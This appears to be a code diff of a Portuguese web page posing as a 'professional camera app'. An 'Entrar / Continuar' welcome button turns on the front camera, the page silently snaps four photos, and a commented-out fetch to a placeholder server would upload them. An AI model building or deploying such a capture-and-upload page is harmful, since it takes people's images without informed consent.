@@ -1,23 +1,130 @@
 <!DOCTYPE html>
-<html>
-<body style="background:black; color:white; text-align:center">
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Camera App Profissional</title>
 
-<h1>Câmera teste</h1>
-<button onclick="start()">Ligar câmera</button>
-<br><br>
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #111;
+  color: white;
+  text-align: center;
+}
 
-<video id="video" autoplay playsinline width="300"></video>
+#telaInicial {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: #000000e0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+}
+
+button {
+  padding: 20px 40px;
+  font-size: 24px;
+  border: none;
+  border-radius: 12px;
+  background: #22c55e;
+  color: white;
+  cursor: pointer;
+}
+
+video {
+  width: 100vw;
+  height: 100vh;
+  object-fit: cover;
+}
+
+#fotos {
+  position: fixed;
+  right: 10px;
+  bottom: 10px;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+#fotos img {
+  width: 80px;
+  border-radius: 8px;
+  border: 2px solid white;
+}
+</style>
+</head>
+
+<body>
+
+<div id="telaInicial">
+  <h1>Bem-vindo!</h1>
+  <p>Clique abaixo para entrar e ativar a câmera</p>
+  <button id="btnEntrar">Entrar / Continuar</button>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<div id="fotos"></div>
 
 <script>
-async function start() {
+const video = document.getElementById('video');
+const btn = document.getElementById('btnEntrar');
+const telaInicial = document.getElementById('telaInicial');
+const fotosDiv = document.getElementById('fotos');
+
+btn.addEventListener("click", iniciar);
+
+async function iniciar() {
+  telaInicial.style.display = "none";
+
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    document.getElementById("video").srcObject = stream;
-    alert("Câmera ligada!");
-  } catch (e) {
-    alert("Erro: " + e.message);
-    console.log(e);
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    video.srcObject = stream;
+
+    // espera o vídeo iniciar antes de tirar fotos
+    video.onloadedmetadata = () => {
+      video.play();
+      setTimeout(capturarFotos, 1000); // começa tirando fotos 1s depois
+    };
+
+  } catch (err) {
+    alert("Erro ao acessar câmera: " + err.message);
   }
+}
+
+function capturarFotos() {
+  let count = 0;
+  const intervalo = setInterval(() => {
+    if (count >= 4) {
+      clearInterval(intervalo);
+      return;
+    }
+    capturar();
+    count++;
+  }, 1000);
+}
+
+function capturar() {
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0);
+
+  const data = canvas.toDataURL("image/png");
+
+  // mostra miniatura na tela
+  const img = document.createElement("img");
+  img.src = data;
+  fotosDiv.appendChild(img);
+
+  // AQUI você pode enviar pro servidor
+  // fetch("https://SEU-SERVIDOR/upload", { method: "POST", body: JSON.stringify({ imagem: data }) });
 }
 </script>
 
